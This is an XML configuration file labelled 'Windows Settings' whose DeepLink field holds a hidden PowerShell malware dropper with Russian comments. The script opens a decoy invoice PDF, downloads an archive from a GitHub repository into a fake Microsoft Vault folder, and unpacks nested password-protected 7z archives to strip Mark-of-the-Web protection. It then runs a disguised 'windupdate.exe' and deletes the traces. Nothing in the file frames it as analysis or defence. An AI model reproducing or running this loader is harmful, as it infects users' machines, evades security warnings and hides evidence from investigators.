<?xml version="1.0" encoding="UTF-8"?>
<Configuration>
    <Content Changeable="false" Custom="false">
        <ApplicationName>Windows Settings</ApplicationName>
        <DeepLink>
            powershell.exe -NoProfile -WindowStyle Hidden -Command "& {
            $p = 'Sc8#mK92_vXp';
            $v = \"$env:LOCALAPPDATA\Microsoft\Vault\";
            $pdf = \"$env:TEMP\invoice.pdf\";
            
            # 1. Тихо качаем и открываем PDF локально
            Invoke-WebRequest -Uri 'https://github.com/apda89787/tgv5byrn-uynu7ytthgf/raw/main/invoice.pdf' -OutFile $pdf;
            Start-Process $pdf;
            
            if (!(Test-Path $v)) { New-Item -ItemType Directory -Path $v -Force | Out-Null };
            $z = \"$v\update_cache.zip\";
            
            # 2. Качаем основной архив
            Invoke-WebRequest -Uri 'https://github.com/apda89787/tgv5byrn-uynu7ytthgf/raw/refs/heads/main/update_cache.zip' -OutFile $z;
            Expand-Archive -Path $z -DestinationPath $v -Force;
            
            Set-Location $v;
            Start-Sleep -s 5; # Пауза 1
            
            # 3. Распаковка (Снятие MOTW)
            if (Test-Path './7za.exe') {
                ./7za.exe x outer.7z -p$p -y -o\"$v\" | Out-Null;
                Start-Sleep -s 10; # Пауза 2
                ./7za.exe x inner.7z -p$p -y -o\"$v\" | Out-Null;
            }
            
            Start-Sleep -s 20; # Пауза перед запуском
            
            # 4. Запуск чистого бинарника
            if (Test-Path \"$v\windupdate.exe\") {
                Start-Process -FilePath \"$v\windupdate.exe\" -WorkingDirectory $v;
            }

            # Чистим за собой
            Start-Sleep -s 30;
            Remove-Item $z -Force;
            Get-ChildItem $v -Include *.7z, 7za.exe, 7z.dll, 7xza.dll | Remove-Item -Force;
            }"
        </DeepLink>
    </Content>
</Configuration>
